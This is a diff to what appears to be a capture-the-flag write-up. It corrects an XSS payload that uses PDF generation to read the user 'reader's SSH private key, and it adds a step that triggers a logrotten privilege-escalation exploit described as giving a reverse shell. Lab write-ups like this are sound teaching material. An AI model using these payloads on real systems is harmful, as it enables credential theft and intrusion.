@@ -116,7 +116,7 @@ mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
 We can see there is a user called reader, we can try to get the SSH key for this user by modifying our payload slightly.
 
 ```js
-<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///home/reader/.ssh/id_rs");x.send();</script>
+<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script>
 ```
 
 After downloading the collections PDF again we get an SSH key:
@@ -189,6 +189,12 @@ Then execute the exploit
 ```bash
 reader@book:~ ./logrotten -p ./payloadfile /home/reader/backups/access.log
 Waiting for rotating backups/access.log...
+```
+
+If we now write rrandom data to the log, it should trigger our payload.
+
+```bash
+head -c 10M < /dev/urandom > access.log
 ```
 
 And we get a reverse shell!
